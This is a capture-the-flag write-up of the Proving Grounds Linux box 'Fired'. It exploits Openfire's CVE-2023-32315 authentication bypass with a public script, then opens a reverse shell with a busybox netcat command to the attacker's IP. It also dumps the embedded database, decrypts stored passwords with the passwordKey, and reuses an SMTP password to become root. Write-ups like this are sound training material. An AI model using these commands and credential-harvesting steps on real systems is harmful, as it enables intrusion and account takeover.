---
machine: Fired
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [openfire, cve-2023-32315, auth-bypass, plugin-rce, credential-reuse]
date: 2026-08-24
status: retired
summary: A Linux box fronted by an Openfire XMPP server whose Hadoop-flavored nmap fingerprint is a red herring — testing identification and exploitation of a real-world authentication-bypass CVE for a foothold, followed by embedded application-database credential harvesting and password reuse for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/fired/nmapscasns]
└─$ nmap-full target
[*] Running fast port discovery on target...
[*] Open ports: 22,9090,9091
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 08:15 -0400
Nmap scan report for target (192.168.117.96)
Host is up (0.058s latency).

PORT     STATE SERVICE                VERSION
22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
9090/tcp open  hadoop-tasktracker     Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Not valid before: 2024-06-28T07:02:39
|_Not valid after:  2029-06-27T07:02:39
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
```

Given that we see only two hadoop services running we can search for possible exploits related to hadoop:

```bash
┌──(kali㉿kali)-[~/oscp/fired/nmapscasns]
└─$ searchsploit hadoop
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Hadoop YARN ResourceManager - Command Execution (Metasploit)                                                              | linux/remote/45025.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Foothold

If we navigate to `http://<target>:9090` we see an openfire login portal to our presumed hadoop management site:

![Openfire login portal on the port the nmap fingerprint mis-identified as a Hadoop tasktracker](/media/Pasted%20image%2020260824072040.png)

Here we see a version number. After searching for `openfire default credentials` on the internet and not finding anything we move on to searchsploiting the version number for openfire.

```bash
┌──(kali㉿kali)-[~/oscp/fired]
└─$ searchsploit openfire 4.7.3
Exploits: No Results
Shellcodes: No Results
```

However, checking the internet we find:

```text
**Openfire 4.7.3** is affected by **CVE-2023-32315**, a high-severity **authentication bypass** vulnerability with a CVSS score of 7.5.  This flaw allows unauthenticated attackers to access the administrative console via a **path traversal** attack in the setup environment, which can subsequently lead to **Remote Code Execution (RCE)** by uploading malicious plugins.  The vulnerability affects versions from **3.10.0 up to 4.6.8** and **4.7.0 up to 4.7.4**, with the fix released in **Openfire 4.7.5** and **4.6.8**.  Public exploits, including Metasploit modules and Proof-of-Concept (PoC) code on GitHub, are available for this vulnerability.
```

I will use this exploit: https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

```bash
┌──(kali㉿kali)-[~/oscp/fired]
└─$ python3 CVE-2023-32315.py -u http://192.168.117.96:9090

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██     
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████

Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

Patched By: eliasailenei

[*] Launching exploit against: http://192.168.117.96:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```

This gives us access to the dashboard:

![Openfire admin dashboard reached with the CVE-2023-32315 auth-bypass credentials](/media/Pasted%20image%2020260824073324.png)

Here we can navigate to the plugins page and attempt to create and upload a malicious plugin.

We see in the URL `http://target:9090/plugin-admin.jsp` that it uses `.war` so we will want to make our payload a `.war` revshell.

However, we don't have to perform this exploit as it is handled by our previously executed exploit, which goes ahead and sets a management tool plugin password to `123`.

We can execute system commands via this plugin by navigating `Server > Server Settings > Management Tool > System Command`

We can open a listener on port 22 and execute the following command to establish a reverse shell:

```bash
busybox nc 192.168.45.226 22 -e /bin/bash

┌──(kali㉿kali)-[~/oscp/fired]
└─$ sudo penelope -p 22  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
openfire@openfire:/$ whoami
openfire
```

We can read the local.txt from `/home/openfire`

## Privilege Escalation

We can host the files we want to transfer over from our kali to the target box with a python web server on port 80 and `wget` them down into globally writable `/dev/shm` on the target:

```bash
┌──(kali㉿kali)-[~/oscp/tools/linux]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...



openfire@openfire:/dev/shm$ wget http://192.168.45.226/linpeas.sh
--2026-08-24 12:48:20--  http://192.168.45.226/linpeas.sh
Connecting to 192.168.45.226:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090032 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                             100%[============================================================================>]   1.04M  1.77MB/s    in 0.6s    

2026-08-24 12:48:20 (1.77 MB/s) - ‘linpeas.sh’ saved [1090032/1090032]

openfire@openfire:/dev/shm$ chmod +x linpeas.sh 
```

We look up where to find credentials for openfire and find the database located at:

```bash
openfire@openfire:/var/lib/openfire/embedded-db$ cat openfire.script 
...
INSERT INTO OFUSER VALUES('admin','6jmt6vI3cX8BhPXACt7iIBDmnnk=','sEU7/ff4Xd8fOsyjGDfihEhWcmU=','PhvPjr5SE6pjsLlK5nP0/e7mdVKZ+zvr',4096,NULL,'a52a48e57def1a851c91e768042c5bf6078a0cac311d03fd47de71e23bdef5062cbb6f8d836d718d','Administrator','admin@example.com','001719558153170','0')
INSERT INTO OFUSER VALUES('b99aid','0k98XSYx3dhjqtrNX6B83Oo47zc=','ZRV7avtXwyKkdtRldMaJnI3js6U=','bNoNv9mT92tO4qbcZWJ446E5d1trwexh',4096,NULL,'44db8ca8cf3fdd70199acd2445d5032e8ffd6fd193ba8fe4',NULL,NULL,'001719561884593','001719561884593')
INSERT INTO OFOFFLINE VALUES('admin',1,'001719558196515',121,'<message from="localhost" to="admin@localhost"><body>A server or plugin update was found: Openfire 4.8.1</body></message>')
INSERT INTO OFOFFLINE VALUES('admin',2,'001719558196947',119,'<message from="localhost" to="admin@localhost"><body>A server or plugin update was found: Search 1.7.4</body></message>')
INSERT INTO OFID VALUES(18,1)
INSERT INTO OFID VALUES(19,6)
INSERT INTO OFID VALUES(23,1)
INSERT INTO OFID VALUES(25,7)
INSERT INTO OFID VALUES(26,2)
INSERT INTO OFID VALUES(27,1)
INSERT INTO OFPROPERTY VALUES('admin.authorizedJIDs','admin@localhost,b99aid@localhost',0,NULL)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''Rooms.maxLifetime','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('cache.MUCService''conference''Rooms.size','-1',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.configured','true',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.debug','false',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.host','localhost',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.port','25',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.ssl','false',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.username','root',0,NULL)
INSERT INTO OFPROPERTY VALUES('passwordKey','EOAJUe2Sqdlfqjk',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.admin.className','org.jivesoftware.openfire.admin.DefaultAdminProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.auth.className','org.jivesoftware.openfire.auth.DefaultAuthProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.group.className','org.jivesoftware.openfire.group.DefaultGroupProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.lockout.className','org.jivesoftware.openfire.lockout.DefaultLockOutProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.securityAudit.className','org.jivesoftware.openfire.security.DefaultSecurityAuditProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.user.className','org.jivesoftware.openfire.user.DefaultUserProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('provider.vcard.className','org.jivesoftware.openfire.vcard.DefaultVCardProvider',0,NULL)
INSERT INTO OFPROPERTY VALUES('update.lastCheck','1739740001713',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.auth.anonymous','false',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.domain','localhost',0,NULL)
INSERT INTO OFPROPERTY VALUES('xmpp.socket.ssl.active','true',0,NULL)
INSERT INTO OFVERSION VALUES('openfire',33)
INSERT INTO OFSECURITYAUDITLOG VALUES(1,'admin@example.com',1719558562661,'Failed admin console login attempt','localhost','A failed login attempt to the admin console was made from address 10.9.1.9. ')
INSERT INTO OFSECURITYAUDITLOG VALUES(2,'admin@example.com',1719558567787,'Failed admin console login attempt','localhost','A failed login attempt to the admin console was made from address 10.9.1.9. ')
INSERT INTO OFSECURITYAUDITLOG VALUES(3,'admin',1719558574995,'Successful admin console login attempt','localhost','The user logged in successfully to the admin console from address 10.9.1.9. ')
INSERT INTO OFSECURITYAUDITLOG VALUES(4,'admin',1719559491026,'updated email service settings','localhost','host = localhost\u000aport = 25\u000ausername = root')
INSERT INTO OFSECURITYAUDITLOG VALUES(5,'b99aid',1719561942693,'Successful admin console login attempt','localhost','The user logged in successfully to the admin console from address 10.9.1.9. ')
INSERT INTO OFSECURITYAUDITLOG VALUES(6,'b99aid',1719562131117,'uploaded plugin openfire-management-tool-plugin.jar','localhost',NULL)
INSERT INTO OFMUCSERVICE VALUES(1,'conference',NULL,0)
INSERT INTO OFPUBSUBNODE VALUES('pubsub','',0,'001719558160778','001719558160778',NULL,0,0,0,0,1,1,1,0,0,'publishers',1,0,'open','','','','localhost','','English','',NULL,'all',-1)
INSERT INTO OFPUBSUBAFFILIATION VALUES('pubsub','','localhost','owner')
INSERT INTO OFPUBSUBDEFAULTCONF VALUES('pubsub',0,0,0,0,0,1,1,1,0,0,'publishers',1,'open','English',NULL,'all',-1)
INSERT INTO OFPUBSUBDEFAULTCONF VALUES('pubsub',1,1,10485760,0,1,1,1,1,0,1,'publishers',1,'open','English',NULL,'all',-1)
```

We find the passwordKey to be `EOAJUe2Sqdlfqjk`, we can attempt to use this to decrypt the other user passwords

We can use an online openfire password decryption tool to use the passwordKey to decrypt the encrypted password back to plaintext:
https://keydecryptor.com/decryption-tools/openfire

The column with the encrypted key is the 7th entry in the OFUSER table in `openfire.script`:

```text
INSERT INTO OFUSER VALUES('admin','6jmt6vI3cX8BhPXACt7iIBDmnnk=','sEU7/ff4Xd8fOsyjGDfihEhWcmU=','PhvPjr5SE6pjsLlK5nP0/e7mdVKZ+zvr',4096,NULL,'a52a48e57def1a851c91e768042c5bf6078a0cac311d03fd47de71e23bdef5062cbb6f8d836d718d','Administrator','admin@example.com','001719558153170','0')
```

```text
#Input
a52a48e57def1a851c91e768042c5bf6078a0cac311d03fd47de71e23bdef5062cbb6f8d836d718d

#Password Key
EOAJUe2Sqdlfqjk

#Result
PwnThePlanet@99
```

We can do this again for the `b99aid` user:

```text
#Input
44db8ca8cf3fdd70199acd2445d5032e8ffd6fd193ba8fe4

#Password Key
EOAJUe2Sqdlfqjk

#Result
04qno4
```

These don't work but if we reread `openfire.script` we find this:

```text
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
```

If we attempt to `su` into root with this password we find that it works:

```bash
openfire@openfire:/usr/share/openfire$ su root
Password: 
root@openfire:/usr/share/openfire# 
```

We can read our `proof.txt` in /root. Box is rooted!
